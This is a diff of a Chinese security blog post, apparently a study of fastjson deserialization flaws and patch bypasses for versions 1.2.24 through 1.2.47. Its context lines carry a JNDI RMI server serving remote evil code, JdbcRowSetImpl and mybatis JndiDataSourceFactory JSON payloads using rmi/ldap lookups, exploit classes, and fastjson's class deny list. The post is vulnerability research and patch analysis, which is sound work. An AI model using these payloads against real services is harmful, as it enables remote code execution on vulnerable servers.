class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-comment">//http://127.0.0.1:7777/JNDIEvilCode.class即可</span><br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Exloit&quot;</span>,<br>                <span class="hljs-string">&quot;JNDIEvilCode&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:7777/&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        registry.bind(<span class="hljs-string">&quot;Exploit&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -682,18 +682,18 @@
 <h4 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h4><p>并不复杂，前面和TemplatesImpl链差不多，只是中间有段临时代码。</p>
 <p>断点直接打到<code>com.sun.rowset.JdbcRowSetImpl</code>的setAutoCommit和setDataSourceName两个函数，我们的payload设置了dataSourceName和autoCommit值，因此会反序列化会调用setAutoCommit和setDataSourceName。</p>
 <p>先进入setAutoCommit，调用了父类的setAutoCommit，参数是我们设置的恶意服务地址。</p>
-<p><img src="/../../pict/image-20240618195133168.png" srcset="/img/loading.gif" lazyload alt="image-20240618195133168"></p>
+<p><img src="/./pict/image-20240618195133168.png" srcset="/img/loading.gif" lazyload alt="image-20240618195133168"></p>
 <p>然后dataSoutce设置为恶意服务地址。</p>
-<p><img src="/../../pict/image-20240618195210821.png" srcset="/img/loading.gif" lazyload alt="image-20240618195210821"></p>
+<p><img src="/./pict/image-20240618195210821.png" srcset="/img/loading.gif" lazyload alt="image-20240618195210821"></p>
 <p>然后进入到setAutoCommit，调用JdbcRowSetImpl#connect方法</p>
-<p><img src="/../../pict/image-20240618195505330.png" srcset="/img/loading.gif" lazyload alt="image-20240618195505330"></p>
+<p><img src="/./pict/image-20240618195505330.png" srcset="/img/loading.gif" lazyload alt="image-20240618195505330"></p>
 <p>然后发现调用了熟悉的lookup，参数是恶意服务地址，接下就是熟悉的JNDI注入了。</p>
-<p><img src="/../../pict/image-20240618195642592.png" srcset="/img/loading.gif" lazyload alt="image-20240618195642592"></p>
+<p><img src="/./pict/image-20240618195642592.png" srcset="/img/loading.gif" lazyload alt="image-20240618195642592"></p>
 <h2 id="fastjson修复手段"><a href="#fastjson修复手段" class="headerlink" title="fastjson修复手段"></a>fastjson修复手段</h2><p>我们先看相比于fastjson1.2.24，作出了什么改变。<br>将DefaultJSONParser.parseObject()函数中的<code>TypeUtils.loadClass</code>替换为checkAutoType()函数</p>
-<p><img src="/../../pict/image-20240618203815699.png" srcset="/img/loading.gif" lazyload alt="image-20240618203815699"></p>
+<p><img src="/./pict/image-20240618203815699.png" srcset="/img/loading.gif" lazyload alt="image-20240618203815699"></p>
 <p>进入checkAutoType函数，大致就是黑白名单对反序列化的类型过滤，如果开启了autoTypeSupport，就先白名单，再黑名单，否则就先黑名单，再白名单。默认情况下，autoTypeSupport为False，即先进行黑名单过滤，遍历denyList，然后遍历acceptList</p>
-<p><img src="/../../pict/image-20240618204240304.png" srcset="/img/loading.gif" lazyload alt="image-20240618204240304"></p>
-<p><img src="/../../pict/image-20240618204322790.png" srcset="/img/loading.gif" lazyload alt="image-20240618204322790"></p>
+<p><img src="/./pict/image-20240618204240304.png" srcset="/img/loading.gif" lazyload alt="image-20240618204240304"></p>
+<p><img src="/./pict/image-20240618204322790.png" srcset="/img/loading.gif" lazyload alt="image-20240618204322790"></p>
 <p>白名单(acceptList)默认为空，黑名单(denyList)有如下类型。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">bsh<br>com.mchange<br>com.sun.<br>java.lang.Thread<br>java.net.Socket<br>java.rmi<br>javax.xml<br>org.apache.bcel<br>org.apache.commons.beanutils<br>org.apache.commons.collections.Transformer<br>org.apache.commons.collections.functors<br>org.apache.commons.collections4.comparators<br>org.apache.commons.fileupload<br>org.apache.myfaces.context.servlet<br>org.apache.tomcat<br>org.apache.wicket.util<br>org.codehaus.groovy.runtime<br>org.hibernate<br>org.jboss<br>org.mozilla.javascript<br>org.python.core<br>org.springframework<br></code></pre></td></tr></table></figure>
 
@@ -1844,36 +1844,36 @@
 <h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>	<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<br>	<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://localhost:1099/Exploit&quot;</span>, <br>	<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>&#125;<br><br>&#123;<br>	<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<br>	<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1099/Exploit&quot;</span>, <br>	<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure>
 
 <h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>很显然与之前的payload相比，<code>com.sun.rowset.JdbcRowSetImpl</code>类名的前面加了<code>L</code>、后面加了<code>;</code>就绕过了黑名单过滤。很明显在TypeUtils#loadClass函数中，如果className以<code>L</code>开头，分号<code>；</code>结尾，就会去掉<code>L</code>和<code>；</code>，然后在加载。条件时只有开启了<code>autoType</code>或者<code>expectClass</code>不为空也就是指定了<code>Class</code>对象时才会调用<code>TypeUtils.loadClass</code>加载，否则<code>fastjson</code>会默认禁止加载该类。</p>
-<p><img src="/../../pict/image-20240619035219066.png" srcset="/img/loading.gif" lazyload alt="image-20240619035219066"></p>
+<p><img src="/./pict/image-20240619035219066.png" srcset="/img/loading.gif" lazyload alt="image-20240619035219066"></p>
 <h2 id="1-2-25-1-2-42-补丁绕过（需要开启AutoType）"><a href="#1-2-25-1-2-42-补丁绕过（需要开启AutoType）" class="headerlink" title="1.2.25-1.2.42 补丁绕过（需要开启AutoType）"></a>1.2.25-1.2.42 补丁绕过（需要开启AutoType）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>	<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<br>	<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://localhost:1099/Exploit&quot;</span>, <br>	<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>&#125;<br><br>&#123;<br>	<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<br>	<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1099/Exploit&quot;</span>, <br>	<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure>
 
 <h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><p>在进行检测之前，会先对LLcom.sun.rowset.JdbcRowSetImpl;;过滤掉一次L和;，因此可以双写，是的过滤掉一次之后任然可以绕过黑名单检测。</p>
-<p><img src="/../../pict/image-20240619041911836.png" srcset="/img/loading.gif" lazyload alt="image-20240619041911836"></p>
+<p><img src="/./pict/image-20240619041911836.png" srcset="/img/loading.gif" lazyload alt="image-20240619041911836"></p>
 <p>然后进入TypeUtils#loadClass方法，传入的参数还是LLcom.sun.rowset.JdbcRowSetImpl;;，那为什么可以加载com.sun.rowset.JdbcRowSetImpl呢。</p>
-<p><img src="/../../pict/image-20240619042209460.png" srcset="/img/loading.gif" lazyload alt="image-20240619042209460"></p>
+<p><img src="/./pict/image-20240619042209460.png" srcset="/img/loading.gif" lazyload alt="image-20240619042209460"></p>
 <p>可以看到<code>TypeUtils#loadClass</code>中会过滤掉<code>L</code>和<code>;</code>然后加载类，但是注意我们进入的是<code>TypeUtils</code>重写的<code>loadClass</code>，通过这个<code>loadClass</code>有来到了一次原来的<code>loadClass</code>，比如<code>loadClassA</code>里面过滤一次<code>L</code>和<code>;</code>，然后调用了<code>loadClassB</code>，通过<code>loadClassB</code>再次调用了<code>loadClassA</code>，在第二次<code>loadClassA</code>又会过滤一次。过滤完之后又会重复一次什么操作，这是第三次我们检查不到<code>L</code>和<code>;</code>于是可以正常加载<code>com.sun.rowset.JdbcRowSetImpl</code>类了。</p>
-<p><img src="/../../pict/image-20240619042339972.png" srcset="/img/loading.gif" lazyload alt="image-20240619042339972"></p>
+<p><img src="/./pict/image-20240619042339972.png" srcset="/img/loading.gif" lazyload alt="image-20240619042339972"></p>
 <h2 id="1-2-25-1-2-43-补丁绕过（需要开启AutoType）"><a href="#1-2-25-1-2-43-补丁绕过（需要开启AutoType）" class="headerlink" title="1.2.25-1.2.43 补丁绕过（需要开启AutoType）"></a>1.2.25-1.2.43 补丁绕过（需要开启AutoType）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>	<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,<br>	<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://localhost:1099/Exploit&quot;</span>, <br>	<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>&#125;<br><br>&#123;<br>	<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,<br>	<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1099/Exploit&quot;</span>, <br>	<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure>
 
 <h3 id="调试分析-2"><a href="#调试分析-2" class="headerlink" title="调试分析"></a>调试分析</h3><p>来到checkAutoType函数，这里的className是我们的@type，不过会先讲$替换成<code>.</code>，这里有个if判断，大概自己试了一下，第一个if判断了是否是L开头;结尾的类名，第二次就是判断是否是LL开头的类名，满足第一个if不满足第二个if就把开头的L和结尾的;去掉然后再去后续操作，满足两个if直接抛出异常。</p>
-<p><img src="/../../pict/image-20240621174551447.png" srcset="/img/loading.gif" lazyload alt="image-20240621174551447"></p>
+<p><img src="/./pict/image-20240621174551447.png" srcset="/img/loading.gif" lazyload alt="image-20240621174551447"></p>
 <p>接着就是白名单和黑名单校验了。不过都是用字符串的哈希值校验</p>
-<p><img src="/../../pict/image-20240621175900559.png" srcset="/img/loading.gif" lazyload alt="image-20240621175900559"></p>
+<p><img src="/./pict/image-20240621175900559.png" srcset="/img/loading.gif" lazyload alt="image-20240621175900559"></p>
 <p>在TypeUtils.loadClass函数中，经过这个函数过后，我们可以加载出来clazz，所以跟进去看看是怎么加载的。</p>
-<p><img src="/../../pict/image-20240621180338814.png" srcset="/img/loading.gif" lazyload alt="image-20240621180338814"></p>
+<p><img src="/./pict/image-20240621180338814.png" srcset="/img/loading.gif" lazyload alt="image-20240621180338814"></p>
 <p>跟到1196行，发现会判断第一个字符是否是<code>[</code>，然后就会将这个符号去掉再加载类，然后我们就加载出了<code>com.sun.rowset.JdbcRowSetImpl</code>，然后通过<code>Array.newInstance(componentType, 0).getClass();</code>这个函数获取返回类。返回的类名是<code>[Lcom.sun.rowset.JdbcRowSetImpl;</code></p>
-<p><img src="/../../pict/image-20240621180912367.png" srcset="/img/loading.gif" lazyload alt="image-20240621180912367"></p>
+<p><img src="/./pict/image-20240621180912367.png" srcset="/img/loading.gif" lazyload alt="image-20240621180912367"></p>
 <p>接着就去获取该类的反序列化器，然后调用方法去反序列化</p>
-<p><img src="/../../pict/image-20240621181658324.png" srcset="/img/loading.gif" lazyload alt="image-20240621181658324"></p>
+<p><img src="/./pict/image-20240621181658324.png" srcset="/img/loading.gif" lazyload alt="image-20240621181658324"></p>
 <p>然后我们加载的类会赋值给clazz然后通过getComponentType函数得到了com.sun.rowset.JdbcRowSetImpl类。然后调用DefaultJsonParser#parseArray方法。</p>
-<p><img src="/../../pict/image-20240621181902647.png" srcset="/img/loading.gif" lazyload alt="image-20240621181902647"></p>
+<p><img src="/./pict/image-20240621181902647.png" srcset="/img/loading.gif" lazyload alt="image-20240621181902647"></p>
 <p>里面会有一些判断字符后面内容是否是<code>[ </code>，<code>&#123;</code>的操作，所以我们的payload需要加上<code>[&#123;</code>。</p>
-<p><img src="/../../pict/image-20240621182831496.png" srcset="/img/loading.gif" lazyload alt="image-20240621182831496"></p>
-<p><img src="/../../pict/image-20240621183006985.png" srcset="/img/loading.gif" lazyload alt="image-20240621183006985"></p>
+<p><img src="/./pict/image-20240621182831496.png" srcset="/img/loading.gif" lazyload alt="image-20240621182831496"></p>
+<p><img src="/./pict/image-20240621183006985.png" srcset="/img/loading.gif" lazyload alt="image-20240621183006985"></p>
 <h2 id="1-2-25-1-2-45补丁绕过（需要开启AutoType）"><a href="#1-2-25-1-2-45补丁绕过（需要开启AutoType）" class="headerlink" title="1.2.25-1.2.45补丁绕过（需要开启AutoType）"></a>1.2.25-1.2.45补丁绕过（需要开启AutoType）</h2><p>前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependencies&gt;<br>      &lt;dependency&gt;<br>          &lt;groupId&gt;com.alibaba&lt;/groupId&gt;<br>          &lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>          &lt;version&gt;<span class="hljs-number">1.2</span><span class="hljs-number">.45</span>&lt;/version&gt;<br>      &lt;/dependency&gt;<br>      &lt;dependency&gt;<br>          &lt;groupId&gt;org.mybatis&lt;/groupId&gt;<br>          &lt;artifactId&gt;mybatis&lt;/artifactId&gt;<br>          &lt;version&gt;<span class="hljs-number">3.4</span><span class="hljs-number">.0</span>&lt;/version&gt;<br>      &lt;/dependency&gt;<br>  &lt;/dependencies&gt;<br></code></pre></td></tr></table></figure>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;&#125;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
@@ -1882,11 +1882,11 @@
 
 <p>fastjson1.2.46黑名单就加入了该类。</p>
 <h3 id="调试分析-3"><a href="#调试分析-3" class="headerlink" title="调试分析"></a>调试分析</h3><p>可以看到相比于上个版本，这里会校验className第一个字符是否是<code>[</code>，h1后面有个L表示是长整型。</p>
-<p><img src="/../../pict/image-20240621191111607.png" srcset="/img/loading.gif" lazyload alt="image-20240621191111607"></p>
+<p><img src="/./pict/image-20240621191111607.png" srcset="/img/loading.gif" lazyload alt="image-20240621191111607"></p>
 <p>校验部分肯定可以过得，因为此时黑名单还没有这个类。我们payload设置了properties这个参数，并且这个类是有setProperties方法的，且满足条件，所以会自动调用。</p>
-<p><img src="/../../pict/image-20240621191436696.png" srcset="/img/loading.gif" lazyload alt="image-20240621191436696"></p>
+<p><img src="/./pict/image-20240621191436696.png" srcset="/img/loading.gif" lazyload alt="image-20240621191436696"></p>
 <p>这里就是熟悉的JNDI注入漏洞了，即<code>InitialContext.lookup()</code>，其中参数由我们输入的properties属性中的data_source值获取的，然后就是jndi注入的部分了。</p>
-<p><img src="/../../pict/image-20240621191946941.png" srcset="/img/loading.gif" lazyload alt="image-20240621191946941"></p>
+<p><img src="/./pict/image-20240621191946941.png" srcset="/img/loading.gif" lazyload alt="image-20240621191946941"></p>
 <h2 id="1-2-25-1-2-47补丁绕过（无需开启AutoType）"><a href="#1-2-25-1-2-47补丁绕过（无需开启AutoType）" class="headerlink" title="1.2.25-1.2.47补丁绕过（无需开启AutoType）"></a>1.2.25-1.2.47补丁绕过（无需开启AutoType）</h2><ul>
 <li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</li>
 <li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</li>
@@ -1899,31 +1899,31 @@
 <p>绕过的大体思路是通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，checkAutoType()就会抛出异常终止程序。</p>
 <h3 id="不受AutoTypeSupport影响的版本"><a href="#不受AutoTypeSupport影响的版本" class="headerlink" title="不受AutoTypeSupport影响的版本"></a>不受AutoTypeSupport影响的版本</h3><p>不受AutoTypeSupport影响的版本为1.2.33-1.2.47，本次调试的是1.2.47版本。</p>
 <h4 id="未开启AutoTypeSupport时"><a href="#未开启AutoTypeSupport时" class="headerlink" title="未开启AutoTypeSupport时"></a>未开启AutoTypeSupport时</h4><p>第一次在调用<code>checkAutoType</code>的时候，由于未开启AutoTypeSupport，因此不会进入黑白名单校验的逻辑；由于@type执行java.lang.Class类，在接下来的findClass()函数中直接被找到，并在后面的if判断clazz不为空后直接返回</p>
-<p><img src="/../../pict/image-20240621203100768.png" srcset="/img/loading.gif" lazyload alt="image-20240621203100768"></p>
+<p><img src="/./pict/image-20240621203100768.png" srcset="/img/loading.gif" lazyload alt="image-20240621203100768"></p>
 <p>接着调用了MiscCodec#deserialze函数。</p>
-<p><img src="/../../pict/image-20240621203411294.png" srcset="/img/loading.gif" lazyload alt="image-20240621203411294"></p>
+<p><img src="/./pict/image-20240621203411294.png" srcset="/img/loading.gif" lazyload alt="image-20240621203411294"></p>
 <p>判断键是否为”val”，是的话就会提取val键对应的值赋给objVal变量，而objVal在后面会赋值给strVal变量</p>
-<p><img src="/../../pict/image-20240621204350838.png" srcset="/img/loading.gif" lazyload alt="image-20240621204350838"></p>
+<p><img src="/./pict/image-20240621204350838.png" srcset="/img/loading.gif" lazyload alt="image-20240621204350838"></p>
 <p>接着判断clazz是否为Class类，是的话调用TypeUtils.loadClass()加载strVal变量值指向的类：</p>
-<p><img src="/../../pict/image-20240621204510782.png" srcset="/img/loading.gif" lazyload alt="image-20240621204510782"></p>
+<p><img src="/./pict/image-20240621204510782.png" srcset="/img/loading.gif" lazyload alt="image-20240621204510782"></p>
 <p>在TypeUtils.loadClass()函数中，成功加载com.sun.rowset.JdbcRowSetImpl类后，就会将其缓存在Map中：</p>
-<p><img src="/../../pict/image-20240621204706910.png" srcset="/img/loading.gif" lazyload alt="image-20240621204706910"></p>
+<p><img src="/./pict/image-20240621204706910.png" srcset="/img/loading.gif" lazyload alt="image-20240621204706910"></p>
 <p>在扫描第二部分的JSON数据时，由于前面第一部分JSON数据中的val键值”com.sun.rowset.JdbcRowSetImpl”已经缓存到Map中了，所以当此时调用TypeUtils.getClassFromMapping()时能够成功从Map中获取到缓存的类，进而在下面的判断clazz是否为空的if语句中直接return返回了，从而成功绕过checkAutoType()检测</p>
-<p><img src="/../../pict/image-20240621205927034.png" srcset="/img/loading.gif" lazyload alt="image-20240621205927034"></p>
+<p><img src="/./pict/image-20240621205927034.png" srcset="/img/loading.gif" lazyload alt="image-20240621205927034"></p>
 <h4 id="开启AutoTypeSupport时"><a href="#开启AutoTypeSupport时" class="headerlink" title="开启AutoTypeSupport时"></a>开启AutoTypeSupport时</h4><p>在第一部分JSON数据的扫描解析中，由于<code>@type</code>指向<code>java.lang.Class</code>，因此即使是开启<code>AutoTypeSupport</code>先后进行白名单、黑名单校验的情况下都能成功通过检测，之后和前面的一样调用findClass()函数获取到Class类：</p>
 <p>关键在于第二部分JSON数据的扫描解析。第二部分的@type指向的是利用类<code>com.sun.rowset.JdbcRowSetImpl</code>，其中的”com.sun.”是在denyList黑名单中的，但是为何在检测时能成功绕过呢？</p>
 <p>我们调试发现，逻辑是先进行白名单再进行黑名单校验，在黑名单校验的if判断条件中是存在两个必须同时满足的条件的：</p>
 <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">if</span> (Arrays.binarySearch(denyHashCodes, <span class="hljs-built_in">hash</span>) &gt;= <span class="hljs-number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="hljs-literal">null</span>) &#123;<br></code></pre></td></tr></table></figure>
 
 <p>第一个判断条件<code>Arrays.binarySearch(denyHashCodes, hash) &gt;= 0</code>是满足的，因为我们的@type包含了黑名单的内容；关键在于第二个判断条件<code>TypeUtils.getClassFromMapping(typeName) == null</code>，这里由于前面已经将<code>com.sun.rowset.JdbcRowSetImpl</code>类缓存在Map中了，也就是说该条件并不满足，导致能够成功绕过黑名单校验、成功触发漏洞。</p>
-<p><img src="/../../pict/image-20240621210325105.png" srcset="/img/loading.gif" lazyload alt="image-20240621210325105"></p>
+<p><img src="/./pict/image-20240621210325105.png" srcset="/img/loading.gif" lazyload alt="image-20240621210325105"></p>
 <h3 id="受AutoTypeSupport影响的版本"><a href="#受AutoTypeSupport影响的版本" class="headerlink" title="受AutoTypeSupport影响的版本"></a>受AutoTypeSupport影响的版本</h3><p>受AutoTypeSupport影响的版本为1.2.25-1.2.32，本次调试的是1.2.25版本。</p>
 <h4 id="未开启AutoTypeSupport时-1"><a href="#未开启AutoTypeSupport时-1" class="headerlink" title="未开启AutoTypeSupport时"></a>未开启AutoTypeSupport时</h4><p>与前面分析差不多</p>
 <h4 id="开启AutoTypeSupport时-1"><a href="#开启AutoTypeSupport时-1" class="headerlink" title="开启AutoTypeSupport时"></a>开启AutoTypeSupport时</h4><p>少了个判断条件，即<code>TypeUtils.getClassFromMapping(typeName) == null</code>，从而无法绕过黑名单检测，导致检测到<code>com.sun.rowset.JdbcRowSetImpl</code>这个黑名单中的类抛出异常。</p>
-<p><img src="/../../pict/image-20240621210940647.png" srcset="/img/loading.gif" lazyload alt="image-20240621210940647"></p>
+<p><img src="/./pict/image-20240621210940647.png" srcset="/img/loading.gif" lazyload alt="image-20240621210940647"></p>
 <h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>将下面的true改成false，防止将<code>com.sun.rowset.JdbcRowSetImpl</code>添加进map缓存里。从而无法使用<code>TypeUtils.getClassFromMapping()</code>来加载</p>
-<p><img src="/../../pict/image-20240622035455611.png" srcset="/img/loading.gif" lazyload alt="image-20240622035455611"></p>
-<p><img src="/../../pict/image-20240622035621233.png" srcset="/img/loading.gif" lazyload alt="image-20240622035621233"></p>
